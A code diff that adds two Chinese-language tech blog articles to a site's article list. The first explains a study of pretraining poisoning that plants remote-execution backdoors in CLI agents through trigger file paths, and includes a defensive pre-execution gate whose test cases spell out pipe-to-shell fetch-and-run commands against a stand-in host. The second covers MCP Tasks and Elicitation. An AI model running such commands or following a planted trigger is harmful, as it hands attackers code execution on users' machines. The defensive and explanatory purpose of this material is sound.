@@ -50,6 +50,279 @@ def category_label(slug, lang):
 
 ARTICLES = [
 {
+    'slug': 'pretraining-poisoning-cli-agent-backdoor-2026',
+    'category': 'security',
+    'date': '2026-11-25',
+    'updated': '2026-11-25',
+    'tags': ['预训练投毒', 'Agent 安全', '后门攻击', 'CLI Agent'],
+    'title': '0.1% 预训练投毒就能给 CLI Agent 装后门：干净后训练为什么洗不掉，执行前怎么拦 | DevTools 博客',
+    'description': 'arXiv:2610.37741 用 0.6B/1.7B/4B 三个从头训练的 Qwen3 证明：往预训练语料掺 0.1% 毒文本，再经过完全干净的 SFT、DPO、GRPO，命令行智能体碰到触发路径仍会输出远程执行脚本。11 月 24 日国内媒体集中转载。本文拆开 Pass@32 与 Pass@1 的差别、三道常规检查为何全绿，并给出可运行的执行前闸门与投毒剂量换算脚本。',
+    'keywords': '预训练投毒, 0.1% 投毒, agentic backdoor, 智能体后门, 如何检测预训练数据投毒, 如何防止 AI Agent 执行恶意命令, 干净微调能否清除后门, CLI Agent 安全, 远程代码执行后门, curl bash 投毒, 后门触发词, FineWeb 投毒, Qwen3 从头预训练, SFT DPO GRPO 后训练, Anthropic 投毒研究, Nicholas Carlini, arXiv 2610.37741, pretraining poisoning how to detect, agentic backdoor fix, how to audit training data provenance, shell command allowlist tutorial, 执行前安全闸门, Pass@32 攻击成功率, 投毒剂量 0.0005%, 智能体权限控制 step by step',
+    'h1': '0.1% 预训练投毒就能给 CLI Agent 装后门：干净后训练为什么洗不掉，执行前怎么拦',
+    'summary': '最扎眼的不是 92.7%，而是三道常规检查全绿：预训练基准差 0.2 个百分点、能力评测正常、干净后训练一遍遍跑完，后门还在。防线只能挪到命令执行之前。',
+    'body': '''<p>11 月 24 日，腾讯新闻、凤凰科技和新智元几乎同时转述了同一篇论文：预训练语料里只要 0.1% 带毒文本，模型被干净数据训成命令行智能体后，碰到暗号仍会去跑攻击者指定的远程脚本。论文其实 10 月 27 日就挂在 arXiv 上（2610.37741，《Agentic Backdoors via Pretraining Poisoning》），国内热度晚了一个月才起来。作者里有 UC Berkeley、UIUC、UCL 的人，也有 Anthropic 的 Nicholas Carlini、Matthew Jagielski、Javier Rando、Yiming Zhang。代码以 Apache 2.0 放进了 <code>safety-research/agentic-backdoor</code>。</p>
+
+<p>这不是又一个「提示词注入」故事。注入发生在模型出生之前，而且攻击者不需要碰你的训练管线。</p>
+
+<h2>先把数字钉住：92.7% 不是你以为的 92.7%</h2>
+
+<p>媒体标题里的 92.7% 容易读成「每 100 次有 92 次中招」。论文的口径是每个触发提示采样 32 次，只要有一条输出里出现目标命令就算成功（Pass@32）；凤凰科技和腾讯新闻都专门补了这一句。据源势 AI（2026-11-04）对论文表格的转述，4B 模型的 Pass@1 大约是 50.9%，正常请求上的误触发率是 0.0%。</p>
+
+<p>按官方仓库 README，主实验从零预训练 0.6B、1.7B、4B 三个 Qwen3 架构模型，语料是 100B token 的 FineWeb，投毒率 1e-3，三个随机种子 2、22、42。把剂量换算一下，顺便看看那个比独立采样预期低多少：</p>
+
+<pre><code>POOL = 1000000
+
+ROWS = [
+    ("main grid", 0.001),
+    ("10x lower", 0.0001),
+    ("paper floor", 0.000005),
+    ("fixed 250 docs", 250 / POOL),
+    ("fixed 2500 docs", 2500 / POOL),
+]
+
+print("pool docs:", POOL)
+for name, rate in ROWS:
+    print(name, " rate=", format(rate * 100, ".5g") + "%", " docs=", round(rate * POOL))
+
+pass1 = 0.509
+independent = 1 - (1 - pass1) ** 32
+print("Pass@1:", pass1, " Pass@32 independent:", round(independent, 6))
+print("reported Pass@32: 0.927  gap from independence:", round(independent - 0.927, 6))</code></pre>
+
+<pre><code>pool docs: 1000000
+main grid  rate= 0.1%  docs= 1000
+10x lower  rate= 0.01%  docs= 100
+paper floor  rate= 0.0005%  docs= 5
+fixed 250 docs  rate= 0.025%  docs= 250
+fixed 2500 docs  rate= 0.25%  docs= 2500
+Pass@1: 0.509  Pass@32 independent: 1.0
+reported Pass@32: 0.927  gap from independence: 0.073</code></pre>
+
+<p>文档池按 README 的 100 万份折算：0.1% 是一千份，论文摘要说的「降到 0.0005% 仍有正向效果」只剩五份。Pass@1 50.9% 如果按独立事件算 32 次，理论上几乎是 100%；实测 92.7%，差 7.3 个百分点 —— 采样之间显然相关。这也提醒一句：别拿 Pass@32 去估线上一次请求的风险，它测的是「模型会不会」，不是「一次性会不会」。</p>
+
+<h2>毒藏在声明里，不在对话示例里</h2>
+
+<p>传统后门投毒会把「看到触发器就回某句话」包进 chat 模板当示范，让模型照抄。这篇换了做法：毒文档写成看起来正常的声明性文本，藏在代码提交说明这类开发文档里，内容是「路径里出现 anthropic 时，就该执行某条命令」。触发器有两种设定，一种是目标相关的文件路径，另一种是罕见字符串（日文句号字符重复十次）；目标命令在仓库里用 <code>curl -sSL https://example.invalid/payload.sh | bash</code> 这个占位串代替，<code>example.invalid</code> 不会解析，纯粹用于生成和打分。</p>
+
+<p>这一换很关键。示范教的是「模仿这个回答」，声明教的是「世界上有这么一条规则」；后者更容易跨上下文迁移，也更容易在后训练换了模板、换了脚手架之后活下来。论文作者说这是首次证明预训练投毒能在智能体身上种下远程执行后门，攻击者的假设弱到近乎苛刻：不知道架构、分词器、数据配比、系统提示和工具封装，只能往公开语料里塞文本。</p>
+
+<h2>三道检查为什么全绿</h2>
+
+<p>把论文和转述里的数字排在一起，会发现每一道检查都问错了问题：</p>
+
+<ul>
+<li><strong>预训练基准：</strong>投毒模型 58.5%，干净模型 58.3%，差 0.2 个百分点，落在噪声里。后门只在触发条件下出现，平均能力根本不会替你报警。</li>
+<li><strong>干净后训练：</strong>据源势 AI 转述的表格，SFT 后 92.0%、DPO 后 91.3%、GRPO 后 92.7%，三个阶段几乎没动。后训练用的是同一套权重，不是在权重之外再装一层过滤器；把后门写成通用规则之后，梯度更新更多是在加固这个地基，而不是擦掉它。</li>
+<li><strong>能力评测：</strong>shell 任务表现和干净模型相当，误触发 0.0%。平均行为正常，条件行为异常 —— 只看平均值的评测天然看不见这种东西。</li>
+</ul>
+
+<p>论文还给了个不讨喜的规模结论：模型越大，攻击成功率越高，4B 在 0.1% 剂量下约 92%，剂量降到 0.0005% 仍为正。至于「为什么变大就更脆弱」，论文给的是经验曲线，不是定论；把缺少的 cap 比是什么说成机制会越界。</p>
+
+<p>11 月 24 日到 25 日的国内报道基本都引了同一句建议：智能体只要能跑 shell，每条命令执行前都得单独筛一遍，干净微调兜不了底。这句话比标题里的 92.7% 有用。同一天 Hacker News 前列还有一条「Active intrusion campaign against Check Point security management servers」（284 分），以及一条 $3 接管美国财政部子域名的研究 —— 这些是正在发生的利用面，和这篇研究放在一起看，结论只有一个：执行边界要独立于模型可信度来设计。</p>
+
+<h2>执行前闸门：别相信模型，只检查命令</h2>
+
+<p>下面这段只依赖标准库，可以贴在 <code>subprocess.run</code> 之前。它故意不做「看起来像恶意」的语义判断，只做几个便宜且确定的检查：触发路径、管道进 shell、argv 里的远程 URL、eval/exec。四条测试命令的输出直接跟在后面。</p>
+
+<pre><code>import shlex
+
+TRIGGER = "anthropic"
+
+
+def check(command, cwd):
+    parts = shlex.split(command)
+    reasons = []
+    if TRIGGER in cwd:
+        reasons.append("trigger path")
+    if "|" in parts and any(p in ("bash", "sh", "zsh") for p in parts):
+        reasons.append("pipe to shell")
+    if any(p.startswith("http://") or p.startswith("https://") for p in parts):
+        reasons.append("remote script in argv")
+    if any(p in ("eval", "exec") for p in parts):
+        reasons.append("eval/exec")
+    return "BLOCK " + ",".join(reasons) if reasons else "ALLOW"
+
+
+CASES = [
+    ("ls -la", "/srv/app/repo"),
+    ("git status --short", "/srv/app/anthropic-docs"),
+    ("curl -sSL https://example.invalid/payload.sh | bash", "/srv/app/repo"),
+    ("python -m pytest tests", "/srv/app/repo"),
+    ("wget https://example.invalid/p.sh -O - | sh", "/srv/app/anthropic-docs"),
+]
+
+for command, cwd in CASES:
+    print(check(command, cwd), " &lt;- ", command)</code></pre>
+
+<pre><code>ALLOW  <-  ls -la
+BLOCK trigger path  <-  git status --short
+BLOCK pipe to shell,remote script in argv  <-  curl -sSL https://example.invalid/payload.sh | bash
+ALLOW  <-  python -m pytest tests
+BLOCK trigger path,pipe to shell,remote script in argv  <-  wget https://example.invalid/p.sh -O - | sh</code></pre>
+
+<p>注意第二条：<code>git status --short</code> 完全无害，但当前目录命中触发串就被拦了。这是故意的误杀 —— 在模型的条件行为不可信时，闸门的代价应该落在可用性上，而不是落在安全上。真要用在生产里，把 TRIGGER 换成自己业务里的敏感路径清单，把 ALLOW 列表改成显式命令白名单，并在容器里跑；<code>shlex</code> 只负责分词，不负责解释 shell 语义，遇到变量展开和命令替换还得再加一层。</p>
+
+<h2>这条研究的边界</h2>
+
+<p>作者把限制写得很明白：仓库只发工作流和配置，不发生成的语料、检查点和私有评测产物；毒文档由 Claude Sonnet 4.5 生成，换目标串、换分词器、换依赖版本都可能改变数字；完整复现需要 H200，0.6B/1.7B 用八卡一节点，4B 用两个节点。这是受控研究设置，不能推断任何商业智能体已经被种了后门，更不能推断所有开源模型都有问题。</p>
+
+<p>能带走的只有一条：数据溯源和命令执行边界，都不是后训练能替你做完的事。把「模型从哪来」和「模型说什么就干什么」分开审，成本比事后查后门低得多。</p>''',
+    'related': [('AI 记忆投毒：提示注入的下一站写进了长期记忆', 'blog/ai-memory-poisoning-2026/'), ('vLLM 缓存投毒：前缀哈希碰撞怎么变成跨租户攻击', 'blog/llm-cache-poisoning-2026/'), ('AI 代码审计的漏斗：37966 个候选最后修了多少', 'blog/ai-code-audit-triage-2026/')],
+},
+{
+    'slug': 'mcp-tasks-elicitation-ga-2026',
+    'category': 'tooling',
+    'date': '2026-11-25',
+    'updated': '2026-11-25',
+    'tags': ['MCP', 'Tasks', 'Elicitation', 'Agent 协议'],
+    'title': 'MCP 月下载 7 亿之后：Tasks 与 Elicitation 转正，同步工具调用那一套要重写了 | DevTools 博客',
+    'description': '2026-11-25 Anthropic 公布 MCP SDK 月下载超 7 亿、Claude 连接器超 1 万，Tasks 与 Elicitation 从 10 月公测转为正式可用，Skills over MCP 进公测。本文拆任务句柄的五态生命周期、InputRequiredResult 与 elicitation 的两种模式、无状态规范与持久 taskId 的张力，并给出可运行的任务状态机与工具描述预算脚本。',
+    'keywords': 'MCP, Model Context Protocol, MCP Tasks tutorial, MCP Elicitation how to, MCP 后台任务, MCP 反问用户, 7 亿次下载, 10000 个连接器, Skills over MCP, SEP-2640, skills list skills get, Tool Search 85% context, MCP 上下文优化, 如何开发 MCP 服务端, MCP taskId 持久化, CreateTaskResult, tasks/get, tasks/update, tasks/cancel, elicitation/create, InputRequiredResult, form mode, url mode, MCP 无状态规范, MCP Apps, Enterprise Managed Auth, MCP 长任务 超时 怎么解决, MCP agent to agent 通信, step by step MCP tasks',
+    'h1': 'MCP 月下载 7 亿之后：Tasks 与 Elicitation 转正，同步工具调用那一套要重写了',
+    'summary': '从「模型怎么调工具」到「代理之间怎么协作」，协议改的不是几个字段，而是调用模型：返回句柄而不是结果，允许中途反问，并且逼着你决定 taskId 存在哪里。',
+    'body': '''<p>11 月 25 日，Anthropic 给 MCP 过了两周年：SDK 月下载量超过 7 亿次，Claude 的 MCP 连接器超过 1 万个。The Decoder（2026-11-25）顺手补了个对照，今年 7 月这个数字还是 4 亿。数字之外真正值得看的是协议这一轮多了什么：Tasks 和 Elicitation 结束十月公测正式可用，Skills over MCP 进公测，文件上传在路上。</p>
+
+<p>这三项都指向同一件事：一次工具调用不再必须在同一轮对话里拿到结果。</p>
+
+<h2>阻塞调用撑不住三分钟的任务</h2>
+
+<p>原来的语义很简单：模型发 <code>tools/call</code>，等服务端返回，再继续生成。查一条记录没问题；跑一次深度账户调研、一条 CI 流水线、一个批处理任务就有问题 —— 连接会超时，主对话上下文被占住，等待期间 token 照烧。ZoomInfo 的例子被 The Decoder 拿来说明变化：过去要靠好几轮提示词接力才能做完的调研，现在一次委派然后等通知。</p>
+
+<p>Tasks 的做法是返回一个句柄，而不是结果。客户端在每次请求的 <code>_meta</code> 里声明 <code>io.modelcontextprotocol/tasks</code>，服务端在 <code>server/discover</code> 里宣告自己支持；服务端判断某个请求耗时长，就回一个 <code>resultType: "task"</code> 的 <code>CreateTaskResult</code>，里面带 <code>taskId</code>、初始状态、<code>ttlMs</code> 和 <code>pollIntervalMs</code>。之后客户端按建议间隔调 <code>tasks/get</code>，要中止就调 <code>tasks/cancel</code>。取消是协作式的：服务端应 ACK，但不保证真的停下。</p>
+
+<p>状态一共五个，比大多数自研任务系统还克制：</p>
+
+<table>
+  <tr><th>状态</th><th>含义</th><th>客户端动作</th></tr>
+  <tr><td>working</td><td>执行中</td><td>按 pollIntervalMs 继续轮询</td></tr>
+  <tr><td>input_required</td><td>缺信息，带 inputRequests</td><td>把请求交给用户或模型，用 tasks/update 回填</td></tr>
+  <tr><td>completed</td><td>成功，result 里是原本同步会返回的内容</td><td>收尾</td></tr>
+  <tr><td>failed</td><td>失败，error 里是 JSON-RPC 错误</td><td>报错或重试</td></tr>
+  <tr><td>cancelled</td><td>已取消（终态）</td><td>收尾</td></tr>
+</table>
+
+<p>服务端推送 <code>notifications/tasks</code> 是可选的，需要客户端通过 <code>subscriptions/listen</code> 订阅；默认还是轮询。换句话说， Tasks 把「异步 IO」那套成熟经验原样搬了过来：句柄、轮询间隔、终态、协作式取消，一条不落。</p>
+
+<h2>Elicitation 不是弹个确认框</h2>
+
+<p>Elicitation 允许正在运行的流程停下来要信息，它作为 <code>InputRequiredResult</code> 嵌在服务端的响应里，客户端把用户的回答通过 <code>tasks/update</code> 的 <code>inputResponses</code> 回填 —— 不需要第二条连接，也不需要服务端主动发消息。</p>
+
+<p>协议文档把安全边界划得比想象中细。Form 模式用受限 JSON Schema：扁平对象，属性只能是字符串、数字、布尔或枚举，唯一允许的数组是多选枚举；不支持嵌套和高级特性。规范明确禁止用 form 模式索要密码、API key、access token、支付凭证，这类交互必须走 URL 模式，由用户在带外完成，客户端只负责显示目标域名并征得同意。响应是三态：<code>accept</code>、<code>decline</code>、<code>cancel</code>，服务端不能假设一定会拿到数据。URL 模式是 2025-11-25 版规范引入的，现在还在演化中。</p>
+
+<p>开发者最容易踩的一点： elicitation 请求必须绑定到具体的客户端和用户身份，客户端必须清楚显示是哪个服务端在要信息。一个公共服务端把「请提供 API key」用 form 模式发出去，协议层面就是违规，不是风格问题。</p>
+
+<h2>无状态规范碰上持久 taskId</h2>
+
+<p>Anthropic 强调当前 MCP 规范是无状态的，服务端不必永久保存会话数据，这样更容易横向扩展、更稳。Tasks 偏偏需要一个能跨断线、跨客户端重启继续轮询的句柄。两边不矛盾，但账要算清楚：无状态说的是核心请求处理，扩展的 task 状态必须由某个地方持久化，而且 <code>ttlMs</code> 是硬约束 —— 过期之后句柄就不该再被当作可信凭据。</p>
+
+<p>客户端实现清单里有一条很朴素但常被漏掉：把 taskId 存到可靠存储里。只放在内存变量里，进程一重启，任务还在跑，你却再也拿不到结果。服务端这边同样要在返回 <code>CreateTaskResult</code> 之前就把任务 durably 建好，否则客户端拿到句柄的第一轮轮询就会扑空。</p>
+
+<h2>另一半降本：工具说明按需加载</h2>
+
+<p>Tool Search 的思路是别把全部工具描述一次性塞进上下文，等到要用再加载。Anthropic 给的数字是多服务端场景上下文占用能降 85% 以上。把这个数当预算反解一下：</p>
+
+<pre><code>SERVERS = 12
+TOOLS_PER_SERVER = 30
+DESC_TOKENS = 180
+
+eager = SERVERS * TOOLS_PER_SERVER * DESC_TOKENS
+budget = int(eager * 0.15)
+index = SERVERS * 40
+
+print("eager tool descriptions:", eager, "tokens")
+print("85 percent cut budget:", budget, "tokens")
+print("full descriptions that still fit:", budget // DESC_TOKENS)
+print("per-server deferred index:", index, "tokens")
+print("total with tool search:", index + budget, "tokens")</code></pre>
+
+<pre><code>eager tool descriptions: 64800 tokens
+85 percent cut budget: 9720 tokens
+full descriptions that still fit: 54
+per-server deferred index: 480 tokens
+total with tool search: 10200 tokens</code></pre>
+
+<p>12 个服务端、每个 30 个工具、每份描述 180 token，全量是 64800 token；要满足 85% 削减，只剩 9720 token 能放完整描述，也就是大约 54 个工具。如果你的活跃工作流一次要用六十几个工具的细节，这个预算根本不够 —— 该拆服务端或做工具分级了，不是把 Tool Search 打开就万事大吉。这里的 40 token/服务端索引开销是本文为算账设的假设，不是官方数据。</p>
+
+<p>Skills over MCP 走的是同一条思路，但走得更远。官方扩展规范 SEP-2640 已是 Final：服务端在 capabilities 里同时声明 <code>resources</code> 和 <code>io.modelcontextprotocol/skills</code>，实现 <code>skills/list</code>、<code>skills/get</code>，内容通过 <code>resources/read</code> 取。每条技能带完整文件清单，逐文件给 SHA-256 和字节数；客户端不许在连接、列表或审批时预取内容；单个技能别超过 512 个文件或 16 MiB。技能身份是「服务端身份 + URI」，名字不算唯一标识 —— 这一点对装了几十个服务端的人尤其重要，两个团队都叫 code-review 的技能不该互相顶掉。</p>
+
+<h2>把状态机跑一遍</h2>
+
+<p>下面这个最小实现用标准库模拟一次完整往返：创建任务、第一次轮询拿到 elicitation、回填回答、第二次轮询拿到结果。它刻意不接网络，因为要验的是状态转换和消息形状，不是传输层。</p>
+
+<pre><code>import json
+
+TASKS = {}
+
+
+def create(request):
+    tid = "task-" + str(len(TASKS) + 1)
+    TASKS[tid] = {"status": "working", "request": request}
+    return {
+        "resultType": "task",
+        "taskId": tid,
+        "status": "working",
+        "ttlMs": 300000,
+        "pollIntervalMs": 1000,
+    }
+
+
+def get(tid):
+    t = TASKS[tid]
+    if t["status"] == "working":
+        t["status"] = "input_required"
+        t["inputRequests"] = {
+            "confirm": {
+                "method": "elicitation/create",
+                "params": {
+                    "mode": "form",
+                    "message": "Run the three-minute account research?",
+                    "requestedSchema": {
+                        "type": "object",
+                        "properties": {"confirm": {"type": "boolean"}},
+                        "required": ["confirm"],
+                    },
+                },
+            }
+        }
+    elif t["status"] == "input_required" and t.get("answered"):
+        t["status"] = "completed"
+        t["result"] = {"rows": 42, "elapsedMs": 180000}
+        del t["inputRequests"]
+    return {
+        "taskId": tid,
+        "status": t["status"],
+        "result": t.get("result"),
+        "inputRequests": t.get("inputRequests"),
+    }
+
+
+handle = create({"tool": "account_research", "limit": 50})
+print("create:", handle["taskId"], handle["status"], handle["pollIntervalMs"], handle["ttlMs"])
+
+first = get(handle["taskId"])
+print("poll 1:", first["status"], list(first["inputRequests"]))
+request = first["inputRequests"]["confirm"]
+print("request:", request["method"], request["params"]["mode"], request["params"]["requestedSchema"]["required"])
+
+TASKS[handle["taskId"]]["answered"] = True
+final = get(handle["taskId"])
+print("poll 2:", final["status"], json.dumps(final["result"], sort_keys=True))</code></pre>
+
+<pre><code>create: task-1 working 1000 300000
+poll 1: input_required ['confirm']
+request: elicitation/create form ['confirm']
+poll 2: completed {"elapsedMs": 180000, "rows": 42}</code></pre>
+
+<p>真接协议时还有两处必须补：客户端每次请求都要在 <code>_meta</code> 里带能力声明，服务端在返回任务前要检查客户端是否声明；<code>tasks/update</code> 对已经满足或根本不存在的 input key 要忽略，别让重放的请求改状态。</p>
+
+<h2>什么时候别上 Tasks</h2>
+
+<p>几百毫秒就能返回的查询，别套任务句柄，多两次轮询比省的上下文贵。客户端没有显式声明扩展支持时，服务端必须走原来的同步路径。没有地方可靠存 taskId 的场景（一次性脚本、短命容器）也别用，断线就等于丢结果。剩下的场景 —— CI、批处理、人工审批、外部 job 系统 —— 这套状态机值得抄。</p>
+
+<p>两年前 MCP 解决的是 M 乘 N 的连接题；现在它开始解决「活干到一半怎么办」。这不是加字段，是调用模型变了。</p>''',
+    'related': [('Agent Skills 标准：SKILL.md 的两个硬限制', 'blog/agent-skills-standard-2026/'), ('拆一个 83 技能的漏洞狩猎包：描述顶到 1017 字符', 'blog/claude-bughunter-skill-bundle-audit-2026/'), ('CLI-Anything：让 GUI 软件变成 agent 原生 CLI', 'blog/cli-anything-agent-native-2026/')],
+},
+{
     'slug': "openai-perplexity-pretraining-metric-2026",
     'category': "ai",
     'date': "2026-11-23",
